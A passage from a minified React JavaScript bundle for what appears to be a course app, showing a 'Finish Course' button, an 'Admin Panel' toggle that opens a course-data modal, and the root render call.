primary",onClick:()=>m("home"),children:["Finish Course",s.jsx(ta,{size:20})]})]})]})]}),s.jsx("button",{className:"admin-trigger",onClick:()=>j(!0),title:"Admin Panel",children:s.jsx(so,{size:24})}),s.jsx(tg,{courseData:Qt,isOpen:q,onClose:()=>{j(!1),window.location.hash=""}})]})}Vp.createRoot(document.getElementById("root")).render(s.jsx($.StrictMode,{children:s.jsx(ag,{})}));
